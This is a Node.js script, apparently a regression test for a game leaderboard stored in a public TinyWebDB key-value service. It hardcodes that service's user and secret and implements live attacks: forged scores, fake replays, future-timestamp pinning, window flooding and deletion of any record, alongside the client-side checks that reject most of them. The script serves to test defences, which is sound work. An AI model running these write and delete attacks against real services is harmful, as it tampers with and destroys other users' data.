#!/usr/bin/env node
/**
 * 排行榜攻击 / 回归演示工具。
 *
 * 背景：旧版榜单存的是 {"n","s","t"} —— 分数是客人自己说的，而 TinyWebDB 是公共
 * key-value（user/secret 藏在页面里），所以伪造分数、拨未来时间戳占窗口、用
 * action=remove 删别人的记录，都只是几行请求的事。本脚本原来就是用来证明这点的。
 *
 * 现在榜单改成「回放即证明」（value 多了 r = 整局回放，读的人用 sim.js 重跑一遍），
 * 本脚本跟着改成了回归测试：同样这些攻击打过去，服务端照样收（它什么都不校验），
 * 但**读的一侧会把它们全部拦下来**。
 *
 * 用法：
 *   node tools/board_spoof.js read       [--verify] [--verify-n 10]   按新规则读榜
 *   node tools/board_spoof.js spoof      --name X --score 99999999   攻击1：直接写数字（老格式，没回放）
 *   node tools/board_spoof.js fakereplay --name X --score 99999999   攻击2：编一段回放，分数写得跟它一致
 *   node tools/board_spoof.js pin        --name X [--years 10]       攻击3：t 拨到未来，想永久占窗口
 *   node tools/board_spoof.js freeze     --name X [--count 20]       攻击4：灌满「最近 20 条」窗口
 *   node tools/board_spoof.js remove     --tag dnw2_xxx_yy           攻击5：删掉别人的记录（可用性攻击）
 *
 *   所有写操作默认真的发包；加 --dry-run 只打印表单不落库。
 *   加 --raw 时读榜走原始 dump，不套任何客户端规则。
 *
 * 结论（跑一遍就知道）：
 *   攻击 1~4  → 写入成功，但 read 里根本看不见（被时间窗 / 无回放 / 分数对不上 / 验证不过拦下）
 *   攻击 5    → 写入成功，记录确实没了 —— 这是纯静态方案绕不开的**可用性**问题，
 *               客户端靠 leaderboard.js 的 selfHeal() 把自己那条补回来。
 */
'use strict';

const path = require('path');
const Sim = require(path.join(__dirname, '..', 'sim.js'));

const API = 'https://tinywebdb.appinventor.space/api';
const USER = 'danaiwa';
const SECRET = '6f52518c';
const PREFIX = 'dnw2_';        // 与 leaderboard.js 一致
const MAX_SCORE = 99999999;
const WINDOW_DAYS = 30;        // 读的一侧只认最近 30 天
const SKEW_MS = 120000;        // 允许 2 分钟时钟误差
const TOP = 20;                // 榜单条数
const CANDIDATES = 40;         // 验证前多捞的候选数
const SCAN_PAGES = 3;
const PAGE = 100;

/* ---------- 与客户端同款的传输层 ---------- */
/* 服务端 502 极其频繁（客户端只重试一次 700ms，实际经常直接失败），
   这里加重试退避，方便稳定复现。 */

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function post(params, tries = 8) {
  const body = new URLSearchParams();
  body.set('user', USER);
  body.set('secret', SECRET);
  for (const k in params) body.set(k, params[k]);

  let last = '';
  for (let i = 0; i < tries; i++) {
    try {
      const res = await fetch(API, { method: 'POST', body });
      const text = (await res.text()).trim();
      if (res.status !== 200) { last = 'HTTP ' + res.status; }
      else if (/^<html/i.test(text)) { last = '网关 502'; }
      else if (!text) { return {}; }
      else {
        try { return JSON.parse(text); }
        catch (e) { throw new Error('服务器返回看不懂：' + text.slice(0, 60)); }
      }
    } catch (e) {
      if (/看不懂/.test(e.message)) throw e;
      last = e.message;
    }
    await sleep(700 + i * 600);
  }
  throw new Error(last || '请求失败');
}

function describe(params) {
  const body = new URLSearchParams();
  body.set('user', USER);
  body.set('secret', SECRET);
  for (const k in params) body.set(k, params[k]);
  return `POST ${API}\n${body.toString().replace(/&/g, ' &')}`;
}

/* ---------- 读榜：与 leaderboard.js 的 parseAll 完全一致的规则 ---------- */

async function scan(pages = SCAN_PAGES) {
  const out = {};
  let no = 1;
  for (let page = 0; page < pages; page++) {
    const obj = await post({ action: 'search', no: String(no), count: String(PAGE), tag: PREFIX, type: 'both' });
    for (const k in obj) {
      if (k.indexOf(PREFIX) === 0 && typeof obj[k] === 'string') out[k] = obj[k];
    }
    no += PAGE;
  }
  return out;
}

/* 回放指纹：刻意不算进声称的分数（换个分数再交一次不算新纪录） */
function replayKey(enc) {
  const p = String(enc).split(';');
  if (p.length < 5) return String(enc);
  return p[0] + ';' + p[1] + ';' + p[2] + ';' + p.slice(4).join(';');
}
function fingerprint(str) {
  const s = replayKey(str);
  let h = 0x811c9dc5;
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i);
    h = (h + ((h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24))) >>> 0;
  }
  return ('0000000' + h.toString(16)).slice(-8);
}

function parseAll(obj) {
  const now = Date.now();
  const minT = now - WINDOW_DAYS * 86400000;
  const maxT = now + SKEW_MS;
  const byPrint = {};
  const dropped = { time: 0, score: 0, noreplay: 0, mismatch: 0, dup: 0 };

  for (const tag in obj) {
    const raw = obj[tag];
    if (typeof raw !== 'string') continue;
    let rec;
    try { rec = JSON.parse(raw); } catch (e) { continue; }

    const t = Number(rec.t);
    if (!isFinite(t) || t < minT || t > maxT) { dropped.time++; continue; }

    const s = Number(rec.s);
    if (!isFinite(s) || s <= 0 || s > MAX_SCORE) { dropped.score++; continue; }

    if (typeof rec.r !== 'string') { dropped.noreplay++; continue; }
    const dec = Sim.decode(rec.r);
    if (!dec) { dropped.noreplay++; continue; }
    if (dec.score !== s) { dropped.mismatch++; continue; }

    const fp = fingerprint(rec.r);
    const item = { tag, name: String(rec.n || '匿名玩家').slice(0, 16), score: s, t, r: rec.r, fp, raw, status: 'pending', reason: '' };
    if (byPrint[fp]) {
      dropped.dup++;
      if (item.t < byPrint[fp].t) continue;
    }
    byPrint[fp] = item;
  }

  const list = [];
  for (const k in byPrint) list.push(byPrint[k]);
  list.sort((a, b) => (b.score - a.score) || (b.t - a.t));
  return { list: list.slice(0, CANDIDATES), dropped, total: Object.keys(obj).length };
}

async function fetchTop(pages) {
  const obj = await scan(pages);
  return parseAll(obj);
}

/* ---------- 写入 ---------- */

function makeTag(at) {
  return PREFIX + (at || Date.now()).toString(36) + '_' +
    Math.random().toString(36).slice(2, 6).padEnd(4, '0');
}

function makeValue(name, score, t, replay) {
  const rec = { n: name, s: score, t: t || Date.now() };
  if (replay) rec.r = replay;
  return JSON.stringify(rec);
}

/* 编一段「自洽但跑不出来」的回放：分数和 r 一致（骗过便宜的预筛），
   但 r 里一次投放都没有，重跑永远判不了负 —— 只有真的重跑才会露馅。 */
function fakeReplay(score) {
  const seed = (Math.random() * 0xffffffff) >>> 0 || 1;
  const end = 3600;
  return `v2;${seed.toString(36)};${end.toString(36)};${score};`;
}

async function write(tag, value, dryRun) {
  const params = { action: 'update', tag, value };
  if (dryRun) {
    console.log('[dry-run] 没有真的发包，请求体如下：\n' + describe(params));
    return { dryRun: true, tag };
  }
  const res = await post(params);
  return { res, tag };
}

/* ---------- 展示 ---------- */

function pad(s, n) {
  s = String(s);
  let w = 0;
  for (const ch of s) w += ch.charCodeAt(0) > 0x2e80 ? 2 : 1;   // 宽字符按 2 列
  return s + ' '.repeat(Math.max(0, n - w));
}

function when(ms) {
  const d = new Date(ms);
  const p = (n) => String(n).padStart(2, '0');
  return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())} ` +
    `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
}

const BADGE = { pending: '⏳', ok: '✅', bad: '❌' };

function showBoard(rows, dropped, total) {
  const d = dropped;
  if (total === undefined) total = rows.length;
  console.log(`库里 ${total} 条；丢弃：时间戳 ${d.time} / 无回放 ${d.noreplay} / 分数对不上 ${d.mismatch} / 重复 ${d.dup} / 分数不合法 ${d.score}`);
  if (!total) { console.log('（新榜还是空的 —— ' + PREFIX + ' 前缀下一条记录都没有）'); return; }
  if (!rows.length) { console.log('（所有记录都被规则拦下了，榜单为空）'); return; }
  console.log(`入榜 ${rows.length} 条（按分数降序，❌ = 重跑出来对不上）\n`);
  rows.forEach((r, i) => {
    const rank = i < 3 ? ['🥇', '🥈', '🥉'][i] : String(i + 1);
    console.log(
      `  ${BADGE[r.status]} ${pad(rank, 3)} ${pad(r.name, 16)} ${pad(r.score, 10)} ` +
      `${when(r.t)}  ${r.tag}` + (r.reason ? `\n      └ ${r.reason}` : '')
    );
  });
}

/* ---------- 命令 ---------- */

function arg(argv, key, dflt) {
  const i = argv.indexOf('--' + key);
  if (i < 0) return dflt;
  const v = argv[i + 1];
  if (v === undefined || v.startsWith('--')) return true;
  return v;
}

async function cmdRead(argv) {
  const pages = Number(arg(argv, 'pages', SCAN_PAGES)) || SCAN_PAGES;
  if (arg(argv, 'raw')) {
    const obj = await scan(pages);
    const keys = Object.keys(obj);
    console.log(`原始 dump：${keys.length} 条（PREFIX=${PREFIX}，${pages} 页）\n`);
    for (const k of keys) console.log(`  ${k} = ${obj[k]}`);
    return;
  }

  const { list, dropped, total } = await fetchTop(pages);
  showBoard(list, dropped, total);

  if (!arg(argv, 'verify')) {
    console.log('\n（只跑了便宜的预筛；加 --verify 才会真的把回放重跑一遍）');
    return;
  }

  const n = Number(arg(argv, 'verify-n', 10)) || 10;
  const jobs = list.slice(0, n);
  console.log(`\n正在把前 ${jobs.length} 条的回放重跑一遍…`);
  for (const row of jobs) {
    const t0 = Date.now();
    const r = Sim.verify(row.r);
    row.status = r.ok ? 'ok' : 'bad';
    row.reason = r.ok ? `${Date.now() - t0} ms 内复现 ${r.score} 分` : r.reason;
  }
  console.log('');
  showBoard(list, dropped, total);
}

async function cmdSpoof(argv) {
  const name = String(arg(argv, 'name', 'PoC'));
  const score = Math.max(0, Math.min(MAX_SCORE, Number(arg(argv, 'score', MAX_SCORE))));
  const dry = !!arg(argv, 'dry-run');
  const tag = makeTag();

  console.log('▶ 攻击1：直接写分数（旧格式，不带回放）');
  console.log('  服务端依旧不校验分数来源、不校验昵称、不对 value 做签名 ——');
  console.log('  写入一定会成功。区别在于读的一侧：没有 r 就没有可验证的成绩。\n');
  const value = makeValue(name, score, Date.now(), null);
  console.log(`  tag   = ${tag}`);
  console.log(`  value = ${value}\n`);

  const r = await write(tag, value, dry);
  if (r.dryRun) return;
  console.log('  服务端返回：' + JSON.stringify(r.res));
  console.log('\n  按新规则读榜（它应该被 noreplay 拦下，看不见）：');
  const { list, dropped, total } = await fetchTop();
  showBoard(list, dropped, total);
}

async function cmdFakeReplay(argv) {
  const name = String(arg(argv, 'name', 'PoC'));
  const score = Math.max(0, Math.min(MAX_SCORE, Number(arg(argv, 'score', MAX_SCORE))));
  const dry = !!arg(argv, 'dry-run');
  const tag = makeTag();
  const rep = fakeReplay(score);

  console.log('▶ 攻击2：编一段回放，让分数和回放「自洽」');
  console.log('  这一步能骗过便宜的预筛（s == r 解码出来的 score），');
  console.log('  唯一的防线是把回放真的重跑一遍 —— 编出来的回放跑不出这个分。\n');
  const value = makeValue(name, score, Date.now(), rep);
  console.log(`  tag   = ${tag}`);
  console.log(`  value = ${value.slice(0, 160)}${value.length > 160 ? '…' : ''}\n`);

  const r = await write(tag, value, dry);
  if (r.dryRun) return;
  console.log('  服务端返回：' + JSON.stringify(r.res));
  console.log('\n  按新规则读榜 + 重跑验证：');
  const { list, dropped, total } = await fetchTop();
  showBoard(list, dropped, total);
  const mine = list.find((x) => x.tag === tag);
  if (mine) {
    const t0 = Date.now();
    const v = Sim.verify(mine.r);
    mine.status = v.ok ? 'ok' : 'bad';
    mine.reason = v.ok ? '居然跑出来了（这段编的回放不该过）' : v.reason;
    console.log(`\n  重跑结果：${BADGE[mine.status]} ${mine.reason}（${Date.now() - t0} ms）`);
    console.log('  —— 这一行在真实榜单上会被标 ❌ 并沉到底，不参与排名。');
  } else {
    console.log('\n  这条记录压根没进候选。');
  }
}

async function cmdPin(argv) {
  const name = String(arg(argv, 'name', 'PoC'));
  const score = Math.max(0, Math.min(MAX_SCORE, Number(arg(argv, 'score', MAX_SCORE))));
  const years = Number(arg(argv, 'years', 10));
  const dry = !!arg(argv, 'dry-run');
  const t = Date.now() + Math.round(years * 365.25 * 86400 * 1000);
  const tag = makeTag();

  console.log('▶ 攻击3：用未来时间戳永久占位（旧版最致命的一击）');
  console.log('  旧版先按 t 倒序取前 20 条当窗口，t 越靠后越能永远霸住榜。');
  console.log('  新版：读的一侧要求 t ∈ [现在-30天, 现在+2分钟]，超界的直接无视。\n');
  console.log(`  t     = ${t}  (${when(t)})`);
  console.log(`  tag   = ${tag}`);
  const value = makeValue(name, score, t, fakeReplay(score));
  console.log(`  value = ${value.slice(0, 120)}…\n`);

  const r = await write(tag, value, dry);
  if (r.dryRun) return;
  console.log('  服务端返回：' + JSON.stringify(r.res));
  console.log('\n  按新规则读榜（应该被 time 拦下）：');
  const { list, dropped, total } = await fetchTop();
  showBoard(list, dropped, total);
}

async function cmdFreeze(argv) {
  const name = String(arg(argv, 'name', 'PoC'));
  const score = Math.max(0, Math.min(MAX_SCORE, Number(arg(argv, 'score', MAX_SCORE))));
  const count = Number(arg(argv, 'count', 20));
  const dry = !!arg(argv, 'dry-run');
  const now = Date.now();

  console.log('▶ 攻击4：灌满「最近 20 条」窗口');
  console.log('  旧版会把所有人挤出去。新版两道闸：');
  console.log('    · 时间戳在未来 → 直接无视（所以灌未来时间没用）；');
  console.log('    · 窗口改成「最近 30 天的前 20 名」按分数排 —— 灌垃圾分数排在后面，');
  console.log('      想占住榜首得真的交出 20 份高分回放。\n');

  const tags = [];
  for (let i = 0; i < count; i++) {
    const tag = makeTag(now + i);
    tags.push(tag);
    const value = makeValue(name, score, now + i, fakeReplay(score));
    console.log(`  ${pad(i + 1, 3)} ${tag}  s=${score}  ${value.slice(0, 60)}…`);
    await write(tag, value, dry);
    if (!dry && i < count - 1) await sleep(120);
  }
  if (dry) return;

  console.log('\n  写完再读一次（应该一条都看不见）：');
  const { list, dropped, total } = await fetchTop();
  showBoard(list, dropped, total);
}

async function cmdRemove(argv) {
  const dry = !!arg(argv, 'dry-run');
  const tag = arg(argv, 'tag', null);
  if (!tag) {
    console.error('要指定 --tag <dnw2_xxx_yy>（可以先用 read 看 tag）。');
    console.error('只对自己的记录做这个实验 —— 删别人的是破坏别人的数据。');
    process.exit(1);
  }

  console.log('▶ 攻击5：直接删记录 —— 这个**依然有效**，而且没有客户端能挡住');
  console.log('  服务端除了 update 还认 action=remove，用的是页面里那份同一个 secret。');
  console.log('  纯静态方案绕不开这一点：写入端对所有人开放，可用性就是保不住。');
  console.log('  能补救的只有「完整性」和「自愈」：');
  console.log('    · 分数删不掉可信度 —— 剩下的记录依然是验过的；');
  console.log('    · leaderboard.js 的 selfHeal() 会把自己那条 (tag,value) 原样写回去。');
  console.log('    想根治只能上后端（写入鉴权 + 服务端签发记录）。\n');
  console.log(`  tag = ${tag}\n`);

  if (dry) {
    console.log('[dry-run] 没有真的发包，请求体如下：');
    console.log(describe({ action: 'remove', tag }));
    return;
  }
  const res = await post({ action: 'remove', tag });
  console.log('  服务端返回：' + JSON.stringify(res));
}

/* ---------- 入口 ---------- */

async function main() {
  const [cmd, ...argv] = process.argv.slice(2);
  const all = ['read', 'spoof', 'fakereplay', 'pin', 'freeze', 'remove'];
  if (!all.includes(cmd)) {
    console.log('用法：node tools/board_spoof.js <' + all.join('|') + '> [选项]');
    console.log('      --dry-run   只打印请求，不真的写入');
    console.log('      read 还支持 --raw / --verify / --verify-n <n> / --pages <n>');
    process.exit(cmd ? 1 : 0);
  }
  if (cmd === 'read') return cmdRead(argv);
  if (cmd === 'spoof') return cmdSpoof(argv);
  if (cmd === 'fakereplay') return cmdFakeReplay(argv);
  if (cmd === 'pin') return cmdPin(argv);
  if (cmd === 'freeze') return cmdFreeze(argv);
  if (cmd === 'remove') return cmdRemove(argv);
}

main().catch((err) => {
  console.error('失败：' + (err && err.message ? err.message : err));
  process.exit(1);
});
